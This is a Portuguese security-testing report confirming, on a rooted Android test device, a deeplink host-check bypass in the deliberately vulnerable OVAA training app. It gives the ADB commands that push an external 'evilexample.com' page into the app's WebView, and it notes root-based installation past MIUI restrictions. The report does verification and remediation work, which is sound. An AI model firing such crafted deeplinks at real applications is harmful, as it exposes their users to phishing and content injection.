# Validação da WebView do OVAA no dispositivo — 2026-10-24

**Resultado: confirmado.** Um deeplink externo abriu `https://evilexample.com/` dentro da `WebViewActivity` do OVAA no Redmi Note 8 (Android 10). `evilexample.com` é um domínio diferente de `example.com`, mas satisfaz a condição `host.endsWith("example.com")`. A página respondeu HTTP 200 e a captura do aparelho mostra a imagem de fundo referenciada no HTML recebido desse domínio.

Esta validação complementa o achado do Flow Lens `f-e01939841f4b8794b880183b`: em `WebViewActivity.onCreate`, `Intent.getStringExtra("url")` alimenta `WebView.loadUrl(...)`. O plugin detectou o fluxo dentro desse método. A ligação com o deeplink exportado e o erro na checagem do host foram examinados no código e confirmados no dispositivo; **o plugin ainda não modela esse caminho entre atividades nem prova sozinho a explorabilidade**.

## Ambiente e preparação

- Checkout: `/home/lucas/Documents/repositories/ovaa`.
- APK de debug existente: SHA-256 `994f0e1a22ede1f76b7404909aa95a8bfcbe75580b0732cdb86cd92cc9856945`. O código do OVAA não foi alterado para o teste.
- Aparelho ADB: `cda39059`, Redmi Note 8, Android 10. `su -c id` confirmou `uid=0(root)`.
- `adb install -r` retornou `INSTALL_FAILED_USER_RESTRICTED` no MIUI. O mesmo APK foi copiado para `/data/local/tmp/ovaa-flow-lens.apk` e instalado com `su -c 'pm install -r ...'`, que retornou `Success`; `pm path oversecured.ovaa` confirmou a instalação. O root foi usado para instalar o APK, não para alterar o processo do app nem a resposta da WebView.
- Revisão independente com Daybreak: o README do próprio OVAA já cita `evilexample.com` como exemplo desta vulnerabilidade. Portanto, trata-se da validação de um problema intencionalmente conhecido no POC, não de uma descoberta inédita.

## Comandos ADB

Para preparar um aparelho com o mesmo bloqueio de instalação do MIUI:

```bash
adb -s cda39059 push /home/lucas/Documents/repositories/ovaa/app/build/outputs/apk/debug/app-debug.apk /data/local/tmp/ovaa-flow-lens.apk
adb -s cda39059 shell su -c 'pm install -r /data/local/tmp/ovaa-flow-lens.apk'
```

Após o teste, removi somente o APK temporário em `/data/local/tmp`; o aplicativo instalado continua disponível no aparelho.

O teste anterior usou `https://example.com/`, um domínio aceito pela checagem, e **não demonstrava URL arbitrária**. O comando executado naquele teste foi:

```bash
adb -s 0068565454 shell am start -W \
  -n oversecured.ovaa/.activities.DeeplinkActivity \
  -a android.intent.action.VIEW \
  -d 'oversecured://ovaa/webview?url=https%3A%2F%2Fexample.com'
```

No aparelho atual, comecei cada controle com `adb -s cda39059 shell am force-stop oversecured.ovaa`. O controle negativo, cuja URL não passa pelo filtro, foi:

```bash
adb -s cda39059 shell am start -W \
  -n oversecured.ovaa/.activities.DeeplinkActivity \
  -a android.intent.action.VIEW \
  -c android.intent.category.BROWSABLE \
  -d 'oversecured://ovaa/webview?url=https%3A%2F%2Fwww.w3.org%2F'
```

O comando que confirmou o bypass foi:

```bash
adb -s cda39059 shell am start -W \
  -n oversecured.ovaa/.activities.DeeplinkActivity \
  -a android.intent.action.VIEW \
  -c android.intent.category.BROWSABLE \
  -d 'oversecured://ovaa/webview?url=https%3A%2F%2Fevilexample.com%2F'
```

Depois, confirmei o primeiro plano com:

```bash
adb -s cda39059 shell dumpsys activity activities | grep mResumedActivity
```

O componente explícito seleciona a atividade exportada para tornar o teste reproduzível mesmo se outro aplicativo registrar o mesmo esquema. Um aplicativo externo também pode iniciar essa atividade exportada. O `url` da query está codificado percentualmente, e o OVAA o passa à WebView sem modificação.

## Evidências e conclusão

| Controle | Resultado de `am start -W` | Primeiro plano após o comando |
| --- | --- | --- |
| `https://www.w3.org/` | `Status: ok`; voltou ao launcher | `com.miui.home/.launcher.Launcher` |
| `https://evilexample.com/` | `Status: ok`; `Activity: oversecured.ovaa/.activities.WebViewActivity` | `oversecured.ovaa/.activities.WebViewActivity` |

O host HTTPS `evilexample.com` respondeu HTTP 200 com `Content-Type: text/html`, título `Test Page. Evilexample.com` e `background-image: url('cat.png')`. A captura do aparelho mostra essa imagem dentro do OVAA; o Mobile MCP também identificou o OVAA em primeiro plano. O processo continuou ativo após o teste.

O caminho no código é verificável em `/home/lucas/Documents/repositories/ovaa/app/src/main/AndroidManifest.xml:8` (deeplink exportado), `DeeplinkActivity.java:46`–`53` (checagem com `endsWith` e encaminhamento da URL) e `WebViewActivity.java:20` (carregamento). Uma comparação de domínio exata, ou de subdomínio com separador `.` e esquema HTTPS permitido, evitaria aceitar nomes como `evilexample.com`.

Este teste confirma o carregamento de uma página externa fora da fronteira pretendida. Não testei login, roubo de arquivos, execução de JavaScript malicioso nem extração de dados. A configuração permissiva de JavaScript e acesso a arquivos em `WebViewActivity` aumenta o interesse do fluxo, mas seus impactos adicionais exigem provas próprias.

## Artefatos

- [Captura da página no OVAA](bypass-screen.png)
- [Execução do bypass](bypass.json)
- [Controle negativo](negative.json)
- [Metadados HTTP da página](remote-page-metadata.json)
- [Resumo de validação automatizada das evidências](validation-summary.json)
- [Log do processo do aplicativo](bypass-app-logcat.txt)
- [Achado estático do Flow Lens](../retest-2026-10-05/llm.md)
